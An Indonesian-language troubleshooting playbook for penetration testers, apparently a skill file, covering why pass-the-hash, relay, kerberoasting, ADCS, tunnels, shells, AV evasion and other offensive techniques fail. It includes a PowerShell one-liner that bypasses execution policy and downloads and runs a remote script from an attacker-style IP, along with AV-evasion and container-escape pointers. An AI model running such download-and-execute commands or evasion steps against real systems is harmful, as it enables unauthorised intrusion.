---
name: "Field Diagnostics — Saat Tool Tidak Sesuai Harapan"
description: "Panduan diagnosis lapangan: gejala, penyebab yang paling mungkin, cara cek cepat, dan tindakan untuk kegagalan umum — PtH, relay, kerberoast, ADCS, tunnel, shell, AV, DNS, BloodHound, SQLi, dan OT."
tags: [diagnostics, troubleshooting, pass-the-hash, relay, tunnel, shell, av, dns]
---

# Field Diagnostics

Operator berpengalaman tidak menambah tool saat gagal; ia mengurangi kemungkinan penyebab. Urutannya: gejala → hipotesis termurah → cek → tindakan.

## 1. Tabel diagnosis

| Gejala | Kemungkinan penyebab | Cek cepat | Tindakan |
|---|---|---|---|
| `nmap -sS` kosong lewat SOCKS | Raw socket tidak didukung proxy | coba `nc -vz` ke satu port | pindah ke `-sT` atau TUN (Ligolo-ng) |
| PtH ditolak | NTLM dinonaktifkan, Protected Users, target butuh Kerberos | cek `nxc smb` error code, grup Protected Users | Overpass-the-Hash, minta TGT, pakai kredensial asli |
| Relay tidak dapat sesi | SMB signing wajib, coercion dipatch, LLMNR mati | `nxc smb --gen-relay-list`, status patch | cari target tanpa signing, atau coercion lain |
| Kerberoast kosong | Tidak ada akun ber-SPN / kredensial kurang | `GetUserSPNs` tanpa `-request` | enumerasi SPN via LDAP, cek service account |
| Hash sulit dipecah | etype AES256, password panjang | jenis hash di output | mode hashcat tepat, wordlist + rules |
| ADCS request ditolak | Hak enroll kurang, template disabled, manager approval | `certipy find -vulnerable` | pilih template lain, cek permission |
| DCSync access denied | Tidak punya hak replikasi | grup dan ACL replikasi | cari jalur ACL/delegasi ke hak itu |
| BloodHound kosong | Kredensial/domain salah, LDAP diblokir | `ldapsearch` manual | koleksi ulang, cek port 389/636 |
| WinRM access denied | User tidak di Remote Management Users | `nxc winrm` | cari host lain, atau eskalasi grup |
| `sudo -l` minta password | Tidak ada NOPASSWD | isi `sudo -l` | cari SUID/capabilities/cron |
| Cron tidak jalan | Service mati, timezone, user shell | `systemctl status cron`, `date` | tunggu window, ganti mekanisme |
| Reverse shell putus | Tanpa PTY, encoding, firewall stateful | uji dengan `nc` sederhana | stabilkan dengan PTY, ganti port/protokol |
| Payload dimakan AV | AMSI/Defender, signature | log Defender | LOtL, encoder, C# runner, compile ulang |
| Tunnel naik tanpa trafik | Route belum ditambah, egress diblokir | `ip route`, `ss -tun` | tambah route, ganti arah tunnel |
| DNS internal gagal | Resolver tidak ikut tunnel | `nslookup` dari pivot | arahkan DNS eksplisit, pakai IP |
| SQLi time-based positif palsu | Latensi jaringan, cache | baseline 3 kali | ulangi, bandingkan delay, uji boolean |
| Upload berhasil tapi 404 | Path webroot salah, eksekusi dimatikan | cek direktori, header server | cari path upload, uji eksekusi |
| Modbus tidak merespons | Unit ID salah, port/firewall | `nmap --script modbus-discover` | coba unit id lain, cek routing |
| Container escape gagal | Seccomp/AppArmor, tanpa CAP_SYS_ADMIN | `capsh --print` | cari jalur lain: socket, hostPath |

## 2. Membaca keheningan

Tidak ada respons bukan berarti tidak ada host. Bedakan:

- **Host mati** — ARP gagal, tidak ada ICMP, tidak ada SYN-ACK.
- **Firewall stateful** — SYN keluar, tidak ada balasan; coba dari arah lain.
- **Filter aplikasi** — TCP terbuka, tetapi aplikasi menolak tanpa header/klien tertentu.
- **Scan salah arah** — interface atau route salah, terutama setelah pivot.

Uji dengan tiga protokol berbeda sebelum menyimpulkan host mati.

## 3. Stabilisasi shell

```bash
# Linux: PTY penuh
python3 -c 'import pty; pty.spawn("/bin/bash")'
# lalu di terminal lokal: Ctrl-Z, stty raw -echo; fg
export TERM=xterm-256color

# Windows: PowerShell dari cmd
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/a.ps1')"
```

Shell yang tidak stabil menghasilkan bukti yang tidak bisa diulang. Stabilkan sebelum mengambil screenshot.

## 4. Prinsip diagnosis

1. **Ubah satu variabel** — jangan mengganti tool dan kredensial sekaligus.
2. **Uji dari dua arah** — dari attacker dan dari pivot.
3. **Catat error code** — kode SMB/Kerberos sering menunjuk penyebab langsung.
4. **Turunkan level** — curl sebelum Burp, `nc` sebelum exploit framework.
5. **Kembali ke baseline** — satu host yang terbukti bisa dipakai sebagai pembanding.

## 5. Best Practices

- Simpan log perintah dan output; diagnosis tanpa log adalah tebakan.
- Jika dua tool berbeda gagal dengan gejala sama, masalahnya di lingkungan, bukan tool.
- Jangan menambah payload saat masalahnya kemungkinan kredensial atau jaringan.
- Tulis penyebab akhir di catatan; itu mencegah pengulangan di host berikutnya.
